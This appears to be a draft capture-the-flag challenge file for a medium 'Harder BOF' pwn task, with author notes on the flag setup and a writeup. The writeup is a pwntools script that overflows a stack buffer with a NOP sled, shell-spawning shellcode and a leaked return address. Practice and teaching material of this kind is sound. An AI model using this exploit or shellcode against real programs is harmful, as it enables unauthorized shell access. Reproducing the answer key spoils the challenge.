# Name
Harder BOF

# Description
Here is a slightly harder pwn challenge that requires you to know how to inject shellcode into a process via a stack buffer overflow. If you're having trouble, do some research on buffer overflows in C.

TODO: Put a netcat command here telling them which server to connect to in order to test the exploit.

# Difficulty
Medium

# Flag
I haven't programmed a flag into this yet. Basically, after they exploit the program, they should get a shell into the server running this program. There should be a flag.txt file on that server in the same directory as the program, which they should be able to cat. Whoever is setting up this server can just put whatever they want into the flag.txt file and have that be the flag.

# Hints
None

# Author Name
Nihaal Prasad

# Writeup
This should be pretty self-explanatory since it's just a basic buffer overflow. Just run this exploit.
```python
#!/usr/bin/env python3
from pwn import *

# Open up the process
p = process("./bof_harder", stdin=PTY)
#p = gdb.debug("./bof_harder", "b *main+224")

# Ignore the first line
p.recvline()

# Second line contains the address
addr = int(p.recvline(), 16) + 9 - 152
print(addr)
addr = p64(addr)

# Generate the payload
shellcode = b"\x48\x81\xec\xf4\x01\x00\x00\x48\x31\xc0\x48\x31\xff\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x48\x31\xc0\xb0\x3b\x48\x31\xdb\x53\xbb\x6e\x2f\x73\x68\x48\xc1\xe3\x10\x66\xbb\x62\x69\x48\xc1\xe3\x10\xb7\x2f\x53\x48\x89\xe7\x48\x83\xc7\x01\x48\x31\xf6\x48\x31\xd2\x0f\x05"
nops = b'\x90'*(152 - len(shellcode))
payload = nops + shellcode + addr

# Trigger the buffer overflow
p.sendline(payload)
p.interactive()
```
